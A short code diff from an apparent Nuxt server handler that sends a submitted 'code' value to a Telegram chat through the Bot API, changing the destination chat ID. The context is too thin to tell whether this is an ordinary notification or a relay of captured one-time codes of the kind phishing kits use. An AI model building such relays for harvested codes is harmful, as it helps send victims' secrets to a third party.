@@ -7,7 +7,7 @@ export default defineEventHandler(async (event) => {
     await $fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
       body: {
-        chat_id: '-4540116402',
+        chat_id: '5618511035',
         text: code
           ? `
           <b>Code:</b> ${code} \n
